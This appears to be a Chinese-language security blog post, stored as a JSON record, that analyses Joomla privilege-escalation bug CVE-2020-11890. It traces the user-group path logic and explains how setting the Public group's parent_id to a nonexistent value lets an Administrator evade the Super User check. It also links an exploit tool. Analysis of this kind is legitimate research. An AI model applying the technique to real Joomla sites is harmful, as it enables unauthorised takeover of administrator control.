Users)：拥有Joomla的所有权限。并且超级管理员只能由另一个超级管理员来创建。\n\n高级管理员（Administrator）：Administrator没有权限将一个用户升级成超级用户或者编辑一个超级用户、不可以修改Joomla的全局设置，没有权限来改变和安装模板和Joomla的语言文件。\n\n作为测试，我们新建三个账号，分别为administrator（administrator用户组）、Super User（Super User用户组）、test（administrator用户组）\n\n![54fffed2367d8208a6295e38b5623ed8.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428153306-806f93d0-8922-1.png)\n\n使用Administrator账号登陆，访问Joomla全局设置链接\n\n/administrator/index.php?option=com_config\n\n![2a2f609df0bd270d060804660fa17480.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428153327-8d03fe1a-8922-1.png)\n\n可见Administrator用户组权限不可以访问该功能页面。\n\n使用Administration账号编辑test账号的用户组\n\n![d0530172f936765cc008a8e8e3a1410f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428153345-97d442f0-8922-1.png)\n\nAdministrator用户组权限不可以为其他的用户添加super user权限\n\n使用Superuser账号登陆，访问Joomla全局设置链接\n\n![2ff54fc05128dca46fb49759eb86b638.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428153402-a1ca0772-8922-1.png)\n\nSuperuser权限可以访问Joomla全局设置页面\n\n使用Superuser账号编辑test账号的用户组\n\n![31887c18adb4d3718c33b3b8245436f2.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428153419-abd77650-8922-1.png)\n\n可以为test账号添加super user权限\n\n### 关于漏洞的初步猜测\n\n在刚看到漏洞简介时，我猜测会不会是joomla只在前端做了校验，使用Administration账号编辑test账号的用户组时，在前端把super user这个选项卡隐藏起来了，后端并未校验权限，使得漏洞产生。\n\n为了验证我的猜想，我在修改test用户组时抓包并修改其中的jform[groups]值\n\n![f0209da75a6809f6aaf7f3916c58770c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428153434-b4e893fa-8922-1.png)\n\n每一个用户组都有一个id值，这个可以通过数据库中查看得来\n\n![05b3d888b44dbde56bdffef80985e726.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428153449-bdceba6c-8922-1.png)\n\n因为我需要将test账号改为super users用户组权限，因此需改数据包中jform[groups]值为8\n\n经过测试发现，这是行不通的\n\n![ddf163abdd76dfeedcf5d9c7e1d85046.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428155900-1eb5a748-8926-1.png)\n\n在猜想失败之后，只好动态调试一下源代码，看一下joomla是如何进行权限校验的\n\n### 动态调试\n\n既然在上文猜想中，我们强行改包时抛出了个Save failed with the following error: User not Super\nAdministrator错误，那么直接在源代码中找到抛出错误的位置libraries\\\\src\\\\User\\\\User.php\n\n![bcf56a673b4558d69adca8eec933d800.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428155933-323e580a-8926-1.png)\n\n可见上图中，只要checkGroup方法为真，则进入if分支抛出Save failed with the following error: User not Super Administrator错误\n\n![cee907a65d171026cfbfd405f9959868.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428155956-3fcda444-8926-1.png)\n\n首先来看下getGroupPath\n\n![3d43d94db146c4e04462b69faccd57f5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160012-498072dc-8926-1.png)\n\ngetGroupPath的作用是通过传入的groupid参数，获取要查询的用户组分支中叶子节点所属用户组，并返回到树的根节点。简而言之，就是获取用户组列表——groups列表中对应用户组的path属性值\n\n### 用户组列表（groups）\n\n我们来看下groups列表是什么，是怎么生成的\n用户组列表（groups）中记录了所有用户组的属性值，包括名称、id、双亲节点信息、该节点的祖先数组\n\n接下来分析下groups列表是怎么生成的\n首先，程序从数据库usergroups表中读取每一个用户组的属性值\n数据库中数据如下\n\n![05b3d888b44dbde56bdffef80985e726.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160033-5604c2b0-8926-1.png)\n\n程序读取后赋值到groups数组中\n\n![90fdb0beecbb1adb14d78ba4f1ac325e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160050-5ff9f72c-8926-1.png)\n\n接着调用populateGroupData方法对groups数组中每个用户组数据进行补充\n\n![5f76e4975217d3c58d3733c1201559b7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160104-68db5a20-8926-1.png)\n\n在这一环节，程序将为每一个用户组提供path与level属性值\n\n其中path属性就是树形结构中以该用户组节点的祖先(Ancestor)数组、level即为该结点的层次(Level\nof Node)\n\n回顾一下数据库中每个用户组的属性值，这里注意parent_id值\n\n![9b80914e36313b90f6c77defc4dbf5fc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160138-7d0fb504-8926-1.png)\n\n除了Public父节点为0之外，其他的用户组在表中都存在对应的双亲节点。可见Public用户组为树形结构中的根节点，层次为1。\n\n![07e4598f33500494dc183fbdb2b39f7e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160156-87604938-8926-1.png)\n\nRegistered、Manager、Super Users、Guest的双亲节点id皆为1，即Public节点 。层次为2\n剩余的用户组节点分别以Registered、Manager、Super Users、Guest四个节点作为双亲节点。\n\n用户节点的树形图如下\n\n![d380e0654c8ff7a223e4070d81c2293e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160213-91700f1c-8926-1.png)\n\n动态调试结果如下\n\n![a8bb90f8b7f5609f6518342305281bcb.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160227-99d3e692-8926-1.png)\n\n从上图可见，这里以Public用户组节点举例：Public作为根节点，其path以及level生成时比较特殊，进入parentid为0的if分支，最终祖先数组path为array(0 =\\> '1')， level为0\n\n再以Registered、Manager、Super Users、Guest这四个层次为2的用户组节点中的Guest节点为例\n\n![be793cbabb3e94b34461a3b6e9965d27.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160240-a1d0d63e-8926-1.png)\n\nGuest节点的path为array (0 =\\> '1',1 =\\>'9',)，level为1。Path是由Guest节点所有祖先组成的集合，level值为该节点层数减一\n\n最后看一下其他层次大于2的节点，以Administrator用户组节点举例\n\n![2e7adc594ec19113eba55f8556eb06a5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160254-aa4b3480-8926-1.png)\n\n从数据库中可见，Administrator用户组双亲节点id为6，对应 Manager节点，Manager用户组节点的双亲节点id为1，对应Public用户组节点。其层次为3\n\n![442d59b0112f8738a3c73b2db904a579.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160309-b305f574-8926-1.png)\n\n通过调试也可看出，Administrator用户组节点的祖先数组path为array (0 =\\> '1', 1 =\\>'6', 2 =\\> '7',)，level为2\n\n在弄明白groups列表之后，看一下程序是如何判断当前用户的权限判断的\n\n回到checkGroup方法中\n\n![cee907a65d171026cfbfd405f9959868.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160327-bdc47b52-8926-1.png)\n\n上文以及指导getGroupPath方法的作用了，由于我们请求构造中的\\$groupid为8，即想把test账号添加到id为8对应的super users组。getGroupPath接收传入的\\$groupid,返回super user节点的祖先数组array (0=\\> '1', 1 =\\> '8',)\n\n![10e711ae91359192c253acec9ba626d1.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160339-c50fa8be-8926-1.png)\n\n接着，在libraries\\\\src\\\\Access\\\\Rule.php的allow方法中，程序遍历superuser的祖先数组array\n(0 =\\> '1', 1 =\\> '8',)\n\n![397c10dfa94bb2ffa87f48fb344cb9b7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160354-cdf627fa-8926-1.png)\n\n程序判断superuser的祖先节点是否有在\\$this-\\>data中出现，\\$this-\\>data值如下\n\n![82817b40c91392827b5ad1386f6d3cae.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160408-d610dbba-8926-1.png)\n\n\\$this-\\>data数组代表目前用户不可以访问的节点id。由于我们使用的是administrator用户组的账号，不可以操作的用户组节点id为8，即super user，因此\\$this-\\>data数组值为array (8 =\\> 1,)\n\nsuperuser的祖先数组中的叶子节点值为8，正好在目前用户不可以访问的\\$this-\\>data数组中\n\n![0e9c21d4f8729213a2a274d86391a653.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160424-dfb7d83a-8926-1.png)\n\n因此该用户权限无法进行操作，程序抛出当前用户不是超级管理员的错误\n\n![6b8bb78abb697b27a0170e1123bbfc5b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160438-e845190e-8926-1.png)\n\n漏洞利用\n--------\n\n通过分析poc发现，这个漏洞利用特别的脑洞大开\n\n![429dbee5ceb4134d398457d1776b09df.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160452-f0a439d6-8926-1.png)\n\n首先看一下Poc中上图片段，poc把public节点的双亲节点改成100，当然这个数字可以为表中任意不存在的id值\n这样做的目的是给原先的根节点public节点安一个双亲节点\n\n由于administrator权限的用户\\$this-\\>data数组值为array (8 =\\>1,)，仅不允许操作super user权限节点，但public对应的祖先数组array (0 =\\>'1')可不在禁止之列，因此administrator权限的用户可以构造上图poc中的数据包，修改public节点的双亲节点\n\npublic节点的双亲节点由0修改为poc中的100后，造成了很大的混乱\n\n程序在处理Public用户组时，由于parentId为100，不再进入if (\\$parentId ===0)分支，然而id为100对应的parentGroup并不存在，导致\\$parentGroup-\\>path值为null\n\n![bedc5b065d46f7cf00fa1bb271eab7d7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160510-fb41c930-8926-1.png)\n\n这样以来，array_merge将一个null和一个数组进行拼接,由于array_merge首参不接受null作为参数使得程序产生错误，\\$group-\\>path也变成null\n\n进而由 count(\\$group-\\>path) – 1得出的level值变为-1（0-1得来）\n\n由于根节点Public的path为null，使得所有后续用户组节点的path都是基于其双亲节点的path值array_merge计算而来，所以所有节点的祖先数组全都为null\n\n在检查当前用户无法访问的节点是否在path中时，由于所有节点的path都为null，所有无法将其祖先列表中的节点一一拿出与无法访问节点列表中的值比对，从而得以逃避检查\n\n![f60e313e4cf7cb84392152c47dff3941.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160523-02f78dae-8927-1.png)\n\n![f60e313e4cf7cb84392152c47dff3941.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160857-82c040e4-8927-1.png)\n\n关于漏洞利用工具可见如下链接：\nhttps://github.com/HoangKien1020/CVE-2020-11890\n\n题外话\n------\n\n在数据库的用户组表中lft和rgt的作用是什么？\n\n![e0e598b530e7352c394fec5266bf6325.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160916-8e2139a2-8927-1.png)\n\n从表中可以看到有lft和rgt两列，这两列的目的在于：\n在树状数据结构中，每一个节点都有一个左右值即lft和rgt。如果右值-左值=1，则代表当前节点为叶子节点；相反，如果右值-左值\\>1，则代表当前节点有子节点，其他左右值在当前节点左右值之间的节点，即为当前结点的所有子节点。从下图可以很好理解其中关系\n\n![140a893d06f2836ca567c059990925e0.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428162648-00c0b6de-892a-1.png)\n\n这个漏洞虽然影响不是很大，joomla官方仅仅给出了低危评分，但是这个漏洞分析起来很有意思，顺带复习了下数据结构。","source":"_posts/Joomla-CVE-2020-11890.md","raw":"---\ntitle: Joomla提权漏洞（CVE-2020-11890）\ntags: web漏洞分析\ncategories: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/381b525f3bbb2cc965a82b68e958dad.jpg\ndate: 2020-05-10 17:27:21\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n漏洞简介\n--------\n\n\n\n近日，joomla官方给出了一个安全公告。从公告可知Joomla! CMS versions 2.5.0 - 3.9.16版本在处理用户组时缺少对根用户组的检查，从而导致了一个提权漏洞的产生(CVE-2020-11890)。\n\n经过我分析之后发现，想要利用这个漏洞，必须先要有一个管理员账号，而这个漏洞的作用仅仅能将管理员提权为超级管理员。\n\n虽然这个漏洞看起来无比鸡肋，但是分析过程却其乐无穷：既了解joomla是如何实现用户组权限划分，又复习了下数据结构。总体上来说漏洞虽小，但分析过程还是很有研究与记录价值的。\n\n漏洞分析\n--------\n\n本次漏洞可以将joomla系统中的Administrator用户提权为Super Users。在分析漏洞前，我们来看一下Super Users与Administrator有什么区别：\n\n超级管理员 (Super Users)：拥有Joomla的所有权限。并且超级管理员只能由另一个超级管理员来创建。\n\n高级管理员（Administrator）：Administrator没有权限将一个用户升级成超级用户或者编辑一个超级用户、不可以修改Joomla的全局设置，没有权限来改变和安装模板和Joomla的语言文件。\n\n作为测试，我们新建三个账号，分别为administrator（administrator用户组）、Super User（Super User用户组）、test（administrator用户组）\n\n![54fffed2367d8208a6295e38b5623ed8.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428153306-806f93d0-8922-1.png)\n\n使用Administrator账号登陆，访问Joomla全局设置链接\n\n/administrator/index.php?option=com_config\n\n![2a2f609df0bd270d060804660fa17480.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428153327-8d03fe1a-8922-1.png)\n\n可见Administrator用户组权限不可以访问该功能页面。\n\n使用Administration账号编辑test账号的用户组\n\n![d0530172f936765cc008a8e8e3a1410f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428153345-97d442f0-8922-1.png)\n\nAdministrator用户组权限不可以为其他的用户添加super user权限\n\n使用Superuser账号登陆，访问Joomla全局设置链接\n\n![2ff54fc05128dca46fb49759eb86b638.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428153402-a1ca0772-8922-1.png)\n\nSuperuser权限可以访问Joomla全局设置页面\n\n使用Superuser账号编辑test账号的用户组\n\n![31887c18adb4d3718c33b3b8245436f2.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428153419-abd77650-8922-1.png)\n\n可以为test账号添加super user权限\n\n### 关于漏洞的初步猜测\n\n在刚看到漏洞简介时，我猜测会不会是joomla只在前端做了校验，使用Administration账号编辑test账号的用户组时，在前端把super user这个选项卡隐藏起来了，后端并未校验权限，使得漏洞产生。\n\n为了验证我的猜想，我在修改test用户组时抓包并修改其中的jform[groups]值\n\n![f0209da75a6809f6aaf7f3916c58770c.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428153434-b4e893fa-8922-1.png)\n\n每一个用户组都有一个id值，这个可以通过数据库中查看得来\n\n![05b3d888b44dbde56bdffef80985e726.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428153449-bdceba6c-8922-1.png)\n\n因为我需要将test账号改为super users用户组权限，因此需改数据包中jform[groups]值为8\n\n经过测试发现，这是行不通的\n\n![ddf163abdd76dfeedcf5d9c7e1d85046.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428155900-1eb5a748-8926-1.png)\n\n在猜想失败之后，只好动态调试一下源代码，看一下joomla是如何进行权限校验的\n\n### 动态调试\n\n既然在上文猜想中，我们强行改包时抛出了个Save failed with the following error: User not Super\nAdministrator错误，那么直接在源代码中找到抛出错误的位置libraries\\\\src\\\\User\\\\User.php\n\n![bcf56a673b4558d69adca8eec933d800.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428155933-323e580a-8926-1.png)\n\n可见上图中，只要checkGroup方法为真，则进入if分支抛出Save failed with the following error: User not Super Administrator错误\n\n![cee907a65d171026cfbfd405f9959868.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428155956-3fcda444-8926-1.png)\n\n首先来看下getGroupPath\n\n![3d43d94db146c4e04462b69faccd57f5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160012-498072dc-8926-1.png)\n\ngetGroupPath的作用是通过传入的groupid参数，获取要查询的用户组分支中叶子节点所属用户组，并返回到树的根节点。简而言之，就是获取用户组列表——groups列表中对应用户组的path属性值\n\n### 用户组列表（groups）\n\n我们来看下groups列表是什么，是怎么生成的\n用户组列表（groups）中记录了所有用户组的属性值，包括名称、id、双亲节点信息、该节点的祖先数组\n\n接下来分析下groups列表是怎么生成的\n首先，程序从数据库usergroups表中读取每一个用户组的属性值\n数据库中数据如下\n\n![05b3d888b44dbde56bdffef80985e726.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160033-5604c2b0-8926-1.png)\n\n程序读取后赋值到groups数组中\n\n![90fdb0beecbb1adb14d78ba4f1ac325e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160050-5ff9f72c-8926-1.png)\n\n接着调用populateGroupData方法对groups数组中每个用户组数据进行补充\n\n![5f76e4975217d3c58d3733c1201559b7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160104-68db5a20-8926-1.png)\n\n在这一环节，程序将为每一个用户组提供path与level属性值\n\n其中path属性就是树形结构中以该用户组节点的祖先(Ancestor)数组、level即为该结点的层次(Level\nof Node)\n\n回顾一下数据库中每个用户组的属性值，这里注意parent_id值\n\n![9b80914e36313b90f6c77defc4dbf5fc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160138-7d0fb504-8926-1.png)\n\n除了Public父节点为0之外，其他的用户组在表中都存在对应的双亲节点。可见Public用户组为树形结构中的根节点，层次为1。\n\n![07e4598f33500494dc183fbdb2b39f7e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160156-87604938-8926-1.png)\n\nRegistered、Manager、Super Users、Guest的双亲节点id皆为1，即Public节点 。层次为2\n剩余的用户组节点分别以Registered、Manager、Super Users、Guest四个节点作为双亲节点。\n\n用户节点的树形图如下\n\n![d380e0654c8ff7a223e4070d81c2293e.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160213-91700f1c-8926-1.png)\n\n动态调试结果如下\n\n![a8bb90f8b7f5609f6518342305281bcb.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160227-99d3e692-8926-1.png)\n\n从上图可见，这里以Public用户组节点举例：Public作为根节点，其path以及level生成时比较特殊，进入parentid为0的if分支，最终祖先数组path为array(0 =\\> '1')， level为0\n\n再以Registered、Manager、Super Users、Guest这四个层次为2的用户组节点中的Guest节点为例\n\n![be793cbabb3e94b34461a3b6e9965d27.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160240-a1d0d63e-8926-1.png)\n\nGuest节点的path为array (0 =\\> '1',1 =\\>'9',)，level为1。Path是由Guest节点所有祖先组成的集合，level值为该节点层数减一\n\n最后看一下其他层次大于2的节点，以Administrator用户组节点举例\n\n![2e7adc594ec19113eba55f8556eb06a5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160254-aa4b3480-8926-1.png)\n\n从数据库中可见，Administrator用户组双亲节点id为6，对应 Manager节点，Manager用户组节点的双亲节点id为1，对应Public用户组节点。其层次为3\n\n![442d59b0112f8738a3c73b2db904a579.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160309-b305f574-8926-1.png)\n\n通过调试也可看出，Administrator用户组节点的祖先数组path为array (0 =\\> '1', 1 =\\>'6', 2 =\\> '7',)，level为2\n\n在弄明白groups列表之后，看一下程序是如何判断当前用户的权限判断的\n\n回到checkGroup方法中\n\n![cee907a65d171026cfbfd405f9959868.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160327-bdc47b52-8926-1.png)\n\n上文以及指导getGroupPath方法的作用了，由于我们请求构造中的\\$groupid为8，即想把test账号添加到id为8对应的super users组。getGroupPath接收传入的\\$groupid,返回super user节点的祖先数组array (0=\\> '1', 1 =\\> '8',)\n\n![10e711ae91359192c253acec9ba626d1.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160339-c50fa8be-8926-1.png)\n\n接着，在libraries\\\\src\\\\Access\\\\Rule.php的allow方法中，程序遍历superuser的祖先数组array\n(0 =\\> '1', 1 =\\> '8',)\n\n![397c10dfa94bb2ffa87f48fb344cb9b7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160354-cdf627fa-8926-1.png)\n\n程序判断superuser的祖先节点是否有在\\$this-\\>data中出现，\\$this-\\>data值如下\n\n![82817b40c91392827b5ad1386f6d3cae.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160408-d610dbba-8926-1.png)\n\n\\$this-\\>data数组代表目前用户不可以访问的节点id。由于我们使用的是administrator用户组的账号，不可以操作的用户组节点id为8，即super user，因此\\$this-\\>data数组值为array (8 =\\> 1,)\n\nsuperuser的祖先数组中的叶子节点值为8，正好在目前用户不可以访问的\\$this-\\>data数组中\n\n![0e9c21d4f8729213a2a274d86391a653.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160424-dfb7d83a-8926-1.png)\n\n因此该用户权限无法进行操作，程序抛出当前用户不是超级管理员的错误\n\n![6b8bb78abb697b27a0170e1123bbfc5b.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160438-e845190e-8926-1.png)\n\n漏洞利用\n--------\n\n通过分析poc发现，这个漏洞利用特别的脑洞大开\n\n![429dbee5ceb4134d398457d1776b09df.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160452-f0a439d6-8926-1.png)\n\n首先看一下Poc中上图片段，poc把public节点的双亲节点改成100，当然这个数字可以为表中任意不存在的id值\n这样做的目的是给原先的根节点public节点安一个双亲节点\n\n由于administrator权限的用户\\$this-\\>data数组值为array (8 =\\>1,)，仅不允许操作super user权限节点，但public对应的祖先数组array (0 =\\>'1')可不在禁止之列，因此administrator权限的用户可以构造上图poc中的数据包，修改public节点的双亲节点\n\npublic节点的双亲节点由0修改为poc中的100后，造成了很大的混乱\n\n程序在处理Public用户组时，由于parentId为100，不再进入if (\\$parentId ===0)分支，然而id为100对应的parentGroup并不存在，导致\\$parentGroup-\\>path值为null\n\n![bedc5b065d46f7cf00fa1bb271eab7d7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160510-fb41c930-8926-1.png)\n\n这样以来，array_merge将一个null和一个数组进行拼接,由于array_merge首参不接受null作为参数使得程序产生错误，\\$group-\\>path也变成null\n\n进而由 count(\\$group-\\>path) – 1得出的level值变为-1（0-1得来）\n\n由于根节点Public的path为null，使得所有后续用户组节点的path都是基于其双亲节点的path值array_merge计算而来，所以所有节点的祖先数组全都为null\n\n在检查当前用户无法访问的节点是否在path中时，由于所有节点的path都为null，所有无法将其祖先列表中的节点一一拿出与无法访问节点列表中的值比对，从而得以逃避检查\n\n![f60e313e4cf7cb84392152c47dff3941.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160523-02f78dae-8927-1.png)\n\n![f60e313e4cf7cb84392152c47dff3941.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160857-82c040e4-8927-1.png)\n\n关于漏洞利用工具可见如下链接：\nhttps://github.com/HoangKien1020/CVE-2020-11890\n\n题外话\n------\n\n在数据库的用户组表中lft和rgt的作用是什么？\n\n![e0e598b530e7352c394fec5266bf6325.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428160916-8e2139a2-8927-1.png)\n\n从表中可以看到有lft和rgt两列，这两列的目的在于：\n在树状数据结构中，每一个节点都有一个左右值即lft和rgt。如果右值-左值=1，则代表当前节点为叶子节点；相反，如果右值-左值\\>1，则代表当前节点有子节点，其他左右值在当前节点左右值之间的节点，即为当前结点的所有子节点。从下图可以很好理解其中关系\n\n![140a893d06f2836ca567c059990925e0.png](https://xzfile.aliyuncs.com/media/upload/picture/20200428162648-00c0b6de-892a-1.png)\n\n这个漏洞虽然影响不是很大，joomla官方仅仅给出了低危评分，但是这个漏洞分析起来很有意思，顺带复习了下数据结构。","slug":"Joomla-CVE-2020-11890","published":1,"updated":"2020-10-27T09:25:29.479Z","_id":"ckgrozu8i000ywsa9h5ul8gih","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"漏洞简介\"><a href=\"#漏洞简介\" class=\"headerlink\" title=\"漏洞简介\"></a>漏洞简介</h2><p>近日，joomla官方给出了一个安全公告。从公告可知Joomla! CMS versions 2.5.0 - 3.9.16版本在处理用户组时缺少对根用户组的检查，从而导致了一个提权漏洞的产生(CVE-2020-11890)。</p>\n<p>经过我分析之后发现，想要利用这个漏洞，必须先要有一个管理员账号，而这个漏洞的作用仅仅能将管理员提权为超级管理员。</p>\n<p>虽然这个漏洞看起来无比鸡肋，但是分析过程却其乐无穷：既了解joomla是如何实现用户组权限划分，又复习了下数据结构。总体上来说漏洞虽小，但分析过程还是很有研究与记录价值的。</p>\n<h2 id=\"漏洞分析\"><a href=\"#漏洞分析\" class=\"headerlink\" title=\"漏洞分析\"></a>漏洞分析</h2><p>本次漏洞可以将joomla系统中的Administrator用户提权为Super Users。在分析漏洞前，我们来看一下Super Users与Administrator有什么区别：</p>\n<p>超级管理员 (Super Users)：拥有Joomla的所有权限。并且超级管理员只能由另一个超级管理员来创建。</p>\n<p>高级管理员（Administrator）：Administrator没有权限将一个用户升级成超级用户或者编辑一个超级用户、不可以修改Joomla的全局设置，没有权限来改变和安装模板和Joomla的语言文件。</p>\n<p>作为测试，我们新建三个账号，分别为administrator（administrator用户组）、Super User（Super User用户组）、test（administrator用户组）</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428153306-806f93d0-8922-1.png\" alt=\"54fffed2367d8208a6295e38b5623ed8.png\"></p>\n<p>使用Administrator账号登陆，访问Joomla全局设置链接</p>\n<p>/administrator/index.php?option=com_config</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428153327-8d03fe1a-8922-1.png\" alt=\"2a2f609df0bd270d060804660fa17480.png\"></p>\n<p>可见Administrator用户组权限不可以访问该功能页面。</p>\n<p>使用Administration账号编辑test账号的用户组</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428153345-97d442f0-8922-1.png\" alt=\"d0530172f936765cc008a8e8e3a1410f.png\"></p>\n<p>Administrator用户组权限不可以为其他的用户添加super user权限</p>\n<p>使用Superuser账号登陆，访问Joomla全局设置链接</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428153402-a1ca0772-8922-1.png\" alt=\"2ff54fc05128dca46fb49759eb86b638.png\"></p>\n<p>Superuser权限可以访问Joomla全局设置页面</p>\n<p>使用Superuser账号编辑test账号的用户组</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428153419-abd77650-8922-1.png\" alt=\"31887c18adb4d3718c33b3b8245436f2.png\"></p>\n<p>可以为test账号添加super user权限</p>\n<h3 id=\"关于漏洞的初步猜测\"><a href=\"#关于漏洞的初步猜测\" class=\"headerlink\" title=\"关于漏洞的初步猜测\"></a>关于漏洞的初步猜测</h3><p>在刚看到漏洞简介时，我猜测会不会是joomla只在前端做了校验，使用Administration账号编辑test账号的用户组时，在前端把super user这个选项卡隐藏起来了，后端并未校验权限，使得漏洞产生。</p>\n<p>为了验证我的猜想，我在修改test用户组时抓包并修改其中的jform[groups]值</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428153434-b4e893fa-8922-1.png\" alt=\"f0209da75a6809f6aaf7f3916c58770c.png\"></p>\n<p>每一个用户组都有一个id值，这个可以通过数据库中查看得来</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428153449-bdceba6c-8922-1.png\" alt=\"05b3d888b44dbde56bdffef80985e726.png\"></p>\n<p>因为我需要将test账号改为super users用户组权限，因此需改数据包中jform[groups]值为8</p>\n<p>经过测试发现，这是行不通的</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428155900-1eb5a748-8926-1.png\" alt=\"ddf163abdd76dfeedcf5d9c7e1d85046.png\"></p>\n<p>在猜想失败之后，只好动态调试一下源代码，看一下joomla是如何进行权限校验的</p>\n<h3 id=\"动态调试\"><a href=\"#动态调试\" class=\"headerlink\" title=\"动态调试\"></a>动态调试</h3><p>既然在上文猜想中，我们强行改包时抛出了个Save failed with the following error: User not Super<br>Administrator错误，那么直接在源代码中找到抛出错误的位置libraries\\src\\User\\User.php</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428155933-323e580a-8926-1.png\" alt=\"bcf56a673b4558d69adca8eec933d800.png\"></p>\n<p>可见上图中，只要checkGroup方法为真，则进入if分支抛出Save failed with the following error: User not Super Administrator错误</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428155956-3fcda444-8926-1.png\" alt=\"cee907a65d171026cfbfd405f9959868.png\"></p>\n<p>首先来看下getGroupPath</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160012-498072dc-8926-1.png\" alt=\"3d43d94db146c4e04462b69faccd57f5.png\"></p>\n<p>getGroupPath的作用是通过传入的groupid参数，获取要查询的用户组分支中叶子节点所属用户组，并返回到树的根节点。简而言之，就是获取用户组列表——groups列表中对应用户组的path属性值</p>\n<h3 id=\"用户组列表（groups）\"><a href=\"#用户组列表（groups）\" class=\"headerlink\" title=\"用户组列表（groups）\"></a>用户组列表（groups）</h3><p>我们来看下groups列表是什么，是怎么生成的<br>用户组列表（groups）中记录了所有用户组的属性值，包括名称、id、双亲节点信息、该节点的祖先数组</p>\n<p>接下来分析下groups列表是怎么生成的<br>首先，程序从数据库usergroups表中读取每一个用户组的属性值<br>数据库中数据如下</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160033-5604c2b0-8926-1.png\" alt=\"05b3d888b44dbde56bdffef80985e726.png\"></p>\n<p>程序读取后赋值到groups数组中</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://xzfile.aliyuncs.com/media/upload/picture/20200428160050-5ff9f72c-8926-1.png\" alt=\"90fdb0beecbb1adb14d78ba4f1ac325e.png\"></p>\n<p>接着调用populateGroupData方法对groups数组中每个用户组数据进行补充</p>\n<p><img src= 